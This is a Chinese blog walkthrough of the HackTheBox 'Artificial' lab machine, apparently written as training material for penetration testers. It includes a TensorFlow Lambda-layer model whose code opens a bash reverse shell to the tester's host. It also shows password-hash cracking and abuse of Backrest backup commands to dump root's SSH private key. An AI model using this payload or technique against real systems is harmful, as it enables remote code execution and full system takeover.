> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkwMzYyNzQ1NA==&mid=2247485564&idx=1&sn=d11fe321c143617955c81b04f4a8ad3a

#  HTB Artificial 靶场：从AI模型的RCE到NAS备份系统提权  
原创 红队安全圈  红队安全圈   2025-06-23 07:54  
  
   
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2K9ohfEv3JP2mYJZmoFqadibP2NXm4ndPJ4BsaJLtbVvtsl3EYw8feSrIAFDTC9v6MaWm7MfNzJExg/640?wx_fmt=png&from=appmsg "")  
  
hackthebox 的 Artificial 靶机官方定义为简单难度，实际上你需要对 tensorflow、backrest备份等有初步的了解，否则可能一头雾水，一旦有了初步的认识，加上亿点点🤏搜索技巧，就可以轻松解决掉这个机器  
##### 靶机地址  
> https://app.hackthebox.com/machines/668  
  
#### 适合读者  
  
√ 红队渗透测试人员  
  
√ 企业安全运维人员  
  
√ CTF竞赛战队  
  
√ 想掌握链式攻击思维的安全从业者  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHhp6ugMvLEZTD3ibaAvtRSqWswibu1qUrKHsibMbZyCLfibllWgrq9WUuWA/640?wx_fmt=png&from=appmsg "null")  
  
# 一、信息收集  
  
VPN 连接正常，能够访问目标机器  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHHOKDu6aSm8sfqnmVfQ5KX7MiaLBgCJILqunyNmZcpf8UE2ib5XATIY1g/640?wx_fmt=png&from=appmsg "null")  
  
### 端口扫描  

```
nmap -sT --min-rate 10000 -p- 10.10.11.74 -oA nmapscan/ports
```

  
只开放了 22 和 80 端口  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuH1jc8UH4EytlsYIxvdzW3fAOicMYmXiawX34RCicrykkyHEp2roMuickxpQ/640?wx_fmt=png&from=appmsg "null")  
  
  
继续探测服务详细信息  

```
nmap -sT -Pn -sV -sC -O -p22,80 10.10.11.74
```

  
发现一个域名
```
artificial.htb
```

  
，系统是 Ubuntu  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHicSUQ5RqGGgiaemzjnPu8JVA9gyVQ8LOeUc30hDEetyY5m8lY4rexvYQ/640?wx_fmt=png&from=appmsg "null")  
  
  
域名和 IP 加到 hosts 中  

```
echo '10.10.11.74 artificial.htb' >> /etc/hosts
```

### 子域名探测  
##### gobuster  

```
gobuster vhost -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -u http://artificial.htb -t 30 --append-domain
```

  
没发现其他的子域名  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHnoPEkQtS1yue0hTeoIicx8AuCAq8RxN8uQkYWfFGrAV9YBpuMfKY7Ig/640?wx_fmt=png&from=appmsg "null")  
  
### Web 信息收集  
##### whatweb  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHWRxhqKX0DG9iaFh2SkdRcAb4mlwWib55On3FOHclQeBibojvbicV9wV37Q/640?wx_fmt=png&from=appmsg "null")  
  
##### dirsearch  

```
dirsearch -u http://artificial.htb/ -e * -x 404
```

  
有注册和登录页面  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHCWc9ZibzjMDvadT0ebhia9PwHUUgtKDMvqXWcLDuYvpdTc11JyLe8nHw/640?wx_fmt=png&from=appmsg "null")  
  
### 信息整理  
  
有用的信息并不多，看来只能继续从 80 端口的 web 找突破口  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHe4KSADalwgzcwbIMpToYlOdIcmzFoMKsKicvoRgCiaW6CDps46xKiaODg/640?wx_fmt=png&from=appmsg "null")  
  
# 二、漏洞探测  
### 初步探测  
  
从网站主页可以看出是一个在线 AI 业务，可以在线构建测试和部署 AI 模型  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHuoEaseL2p1xjiaF4icbC7Et9FpibibibibzWTTDun2sp42icw7xiaayuEH5G6w/640?wx_fmt=png&from=appmsg "null")  
  
  
继续看下面给出了 demo，除了 numpy 和 pandas 这两个数据处理库，还用到了 python 的机器学习框架
```
tensorflow
```

  
，这个框架如果遇到恶意的模型可以直接被 RCE 的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHGBFRdyr9nBwciaqht82m9wzAtwkEREf6nro3n1TBic0jbbgfcib90QLww/640?wx_fmt=png&from=appmsg "null")  
  
  
正常注册一个账号并登录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHZicooaledegK6u4ibnWuFiaZ5mlCZTIF5j0OQpvUuneiaK6yNfPoJ4e5Ew/640?wx_fmt=png&from=appmsg "null")  
  
##### 环境配置  
  
登录成功后看到如下页面，可以上传/管理/在线运行自己的模型，根据提示，需要在本地安装 tensorflow 库的 2.13.1 版本来构建自己的模型，不过经后续测试并不强制需要这个版本，任意新版本都行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHIFgnp6KtU7ibAIoicM3pkqfGe86QSicVooDhQQw0Ic4ImX3QaCUbBOgDQ/640?wx_fmt=png&from=appmsg "null")  
  
> 这里有个坑需要注意，tensorflow 最新版也才只支持 pytohn3.12，而 kali 最新版默认的 python 已经是 3.13 版本了，导致我测试时 pip 安装它一直提示平台不支持，可以降级到 Python 低版本再下载对应版本的 whl 包离线安装  
> 离线下载：https://pypi.org/project/tensorflow-cpu/#files  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHWwyHsUcvicjSufuHiczu70Z5YFxQ19HtFPKLaictXI54GNg7tS1pqRGLA/640?wx_fmt=png&from=appmsg "null")  
  
  
本地配置复杂的话也可以使用上面页面的 docker 配置文件在 docker 中构建模型  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHVIZ1DZhwJDpSSjErMAjRUlDdXfHZ4UahHbp9LaSfR65VuCAIOJ5Agw/640?wx_fmt=png&from=appmsg "null")  
  
  
把 Dockerfile 下载到本地  

```
docker build -t my-image .        # 在当前目录构建，这里需要较长的时间
docker run -it my-image           # 进入
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHR9uFH1setyzoMEH4FwPktuGqibDicrSrxYRibHynOrBR6goK09ZMlrr6A/640?wx_fmt=png&from=appmsg "null")  
  
##### 反弹 shell  
  
环境配置好后，查找 tensorflow 的漏洞发现如下文章  
> https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model  
  
  
简单来说就是 Lambda 层允许用户在模型中嵌入任意Python代码。例如一个合法的Lambda层可能用于实现复杂的数学运算，但这种机制并没有限制代码的内容。因此，攻击者可以利用这一点，在Lambda层中嵌入恶意代码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHKRNeK1b4trqibOaSnD1T4KdXVvz5pyROQ2Yb9ngkZibtgtrxgic2ZOf3w/640?wx_fmt=png&from=appmsg "null")  
  
  
根据文中的介绍，构建可以反弹 shell 的简单模型  

```
import tensorflow as tf
import os

def exploit(x):
    import os
    os.system(&#34;/bin/bash -i >& /dev/tcp/10.10.14.78/4444 0>&1&#34;)
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save(&#34;model.h5&#34;)
```

  
生成的
```
.h5
```

  
文件在网页上传，本地设置好监听，点击在线预览即可反弹成功  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHgibVGb9pLHMDNuoGpYbx2fNvGvPnF3PcnF3GB2GBsibsSdZA5ShO0GyQ/640?wx_fmt=png&from=appmsg "null")  
  
### 初步提权  
  
当前用户是 app, 权限很小，只是个 web 权限，不过在当前 instance 目录下找到个 sqlite 数据库文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHuW0GWQlJmsmPpWqLZM7O5XQJFRpXPp3dEmFat9xbzfgCNSIibhh0Mww/640?wx_fmt=png&from=appmsg "null")  
  
  
在当前机器使用 sqlite 打开数据库，浏览里面的内容  

```
# 打开数据库文件
sqlite3 users.db

# 查看表
.tables

# 查看表数据
select * from user;
```

  
user 表看到一个 gael 用户  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuH6dSj5THiaKBic4Z9gwGeedVU92pG3dkIyMA9G5WSZGckWsSHw6ou5kPg/640?wx_fmt=png&from=appmsg "null")  
  
  
查看 passwd 发现 gael 用户是可登录用户，显然这个用户的价值更高，优先看一下它  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHrScpF7icCQLRJfnMgCUSUs8hGfGBWphmJhmQSzXsqCRkrqWlw2FfSYQ/640?wx_fmt=png&from=appmsg "null")  
  
  
把它的哈希用 hashcat 爆破一下，看起来是 md5  

```
hashcat -m 0 c99175974b6e192936d97224638a34f8 /usr/share/wordlists/rockyou.txt
```

  
最终的到密码 gael 用户的密码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuH8HHSQfsvfECjeUicgvX5TF929yDAdFcaQsic1nosN53tj3y3tacN75mQ/640?wx_fmt=png&from=appmsg "null")  
  
  
SSH 登录成功，拿到第一个 flag⛳️  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHmRc4ss33mVRoTictSoT3h4usdAQmtNKx8B4OYvv74jtgu7KhaLtdPEQ/640?wx_fmt=png&from=appmsg "null")  
  
# 三、权限提升  
### 备份文件泄密  
  
先尝试了 sudo、suid、crontab 等都没有可利用的提权  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHV7fNeOrME9RVv76WQia4kFJ1XXBaGttaIBnjjnLStnLwc9TYX5LFjJg/640?wx_fmt=png&from=appmsg "null")  
  
  
使用 linpeas 收集一下可能的提权信息，先提示了几个 CVE 漏洞  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHYw5IpGnLI3ElaBFoSp5Fia8XNuHtFibWVZ12bHl0SS8ZFQLLRWknpAag/640?wx_fmt=png&from=appmsg "null")  
  
  
继续往下看到一个备份文件，拖回本地看一下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHcULd03a5ia5GYaRLnS1tzfCfCZWln1QbDaURAgOtJTzic1WOoWnX38eg/640?wx_fmt=png&from=appmsg "null")  
  
  

```
zxvf
```

  
解压失败？file 命令查看发现它实际只是 tar 文件，并没有用 gzip 压缩，障眼法👀  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHVRCWwZkRxxNS9ut4HIrERFndAXsjt4cmmkATPvZb9dsqsGJSYgGeXQ/640?wx_fmt=png&from=appmsg "null")  
  
  
直接用
```
xvf
```

  
参数解压即可，解压后在
```
.config/backrest/config.json
```

  
文件发现一个账号密码，密码用的是
```
Bcrypt
```

  
加密，但是看起来像被 base64 了一遍  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHXqzeTG7LaGsQAqOCBEYk6N9bDvibwIGIU7ydc7gB4xsWOEKJV5P6cCA/640?wx_fmt=png&from=appmsg "null")  
  
  
先 base64 解码，再使用 john 破解，指定 Bcrypt 加密类型，得到密码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHdGiaIfoye81BNOdDs9xh1PDHymtstNjQTp289yY17Mcktyb15GCOSWg/640?wx_fmt=png&from=appmsg "null")  
  
  
然而 backrest_root 这个用户并不是系统用户，不能 SSH 登录  
### 端口转发  
  
继续查看端口开放情况，发现 5000 和 9898 两个端口，但是仅能本机访问，所以前面 nmap 扫描的时候没有发现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHMFBVzNyjSg2Mibp12EaVsSETXTzq7OianFBiby4klf1UtcAian04qJklNQ/640?wx_fmt=png&from=appmsg "null")  
  
  
通过 ssl 把端口转发出来，发现 9898 是个 web，backrest 备份服务  

```
ssh -L 9898:localhost:9898 gael@artificial.htb
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuH9w6AGic6bwOcW5fUlQjjTM5A6Yrj8hHpn87EKYVsEgiaQCsUia9tJLVmg/640?wx_fmt=png&from=appmsg "null")  
  
  
使用前面破解的
```
backrest_root
```

  
账号密码可以登录成功  
### 快照提权  
  
对于这个系统不是很熟悉，赶紧现学了一下  
> Backrest 是一款基于   
restic  
 构建的 Web 备份解决方案。Backrest 提供了一个 WebUI，它封装了 restic CLI，让您可以轻松创建代码库、浏览快照和恢复文件  
> Github： https://github.com/garethgeorge/backrest  
  
  
可以把服务器或者 NAS 的数据持续进行备份，可以备份到本地也可以备份到云盘  
  
点击主页面左侧的
```
Add Repo
```

  
按钮，先创建个存储库  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHpfzbC5YibDMg6Gwer11e4Iiatj1xEjTuIC4EPt7UM9zm1WWXl2zZtRTw/640?wx_fmt=png&from=appmsg "null")  
  
  
如上图  
- • 存储库名称随便写  
  
- • 存储库路径我选择它本地的 /tmp 目录  
  
- • 环境变量根据红色提示信息填写了一个密码  
  
- • 然后其他的默认，提交即可  
  
创建存储库后可以执行命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHzPse9Rsia5urtw5ibr0SVWjFW1TnB5SAbicaaf7oJ1vicyzJFY5Gk54Hww/640?wx_fmt=png&from=appmsg "null")  
  
  
输入 help 能看到很多帮助命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuH0wzsIjibZo7v7zoAia3LD4o0xESxcLDzMIy6xHl57XGSGLSD88HG5BpA/640?wx_fmt=png&from=appmsg "null")  
  
  
我在其中发现了几个有意思的命令  

```
backup    # 创建一个备份，可以是文件或者文件名
snapshots    # 查看快照的ID
ls    # 查看快照中的文件列表
dump    # 把快照中的文件内容打印出来
```

  
依次执行几个命令进行提取尝试  

```
第一步：backup /root/.ssh/
第二步：snapshots
第三步：ls 快照ID
第四步：dump 快照ID /root/.ssh/id_rsa
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHvKTEr6kqDlnGO1DvpZEtbdric70w9QHicAexFDu5A1VUwOqaxuEZPTdA/640?wx_fmt=png&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHysHuga42mgKfiaSyVmpXXMJ3KnrckadH0AUDpCIYxj7icfkzqFYxNK2g/640?wx_fmt=png&from=appmsg "null")  
  
#####   
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuH1RAoxoUHlMlAOZ7eGxTzYEGIEySl7avwbKWRHURDNiatIvHrUZ6WDOg/640?wx_fmt=png&from=appmsg "null")  
  
  
然后把私钥复制到本地，给 600 权限  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHQgWunr0QRwOc6q7TnqMDVhINyzRibUSibB6pCs1QWrjza33onLYv6ibHA/640?wx_fmt=png&from=appmsg "null")  
  
  
ssh root 登录成功  

```
ssh root@10.10.11.74 -i id_rsa
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2IL8e0lZ1MTdnFKDW5ROOuHhxkyrwXwEdpYquNnEm1zahbHm8Lsp9ibNh0iaMtgjfefJ7EcjNrAH5xA/640?wx_fmt=png&from=appmsg "null")  
  
  
   
  
欢迎关注   
红队安全圈  
，给个  
一键四连  
吧  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/5HsgFkdwV2J3Ykl5xDepRoqkSBlQKAEIEx0DHiaQHx6sBYGNDAI6Eia2ZnZLLsHzD8yxEGEVbrzzTL4Shrf7iaWWw/640?wx_fmt=gif&from=appmsg "")  
  
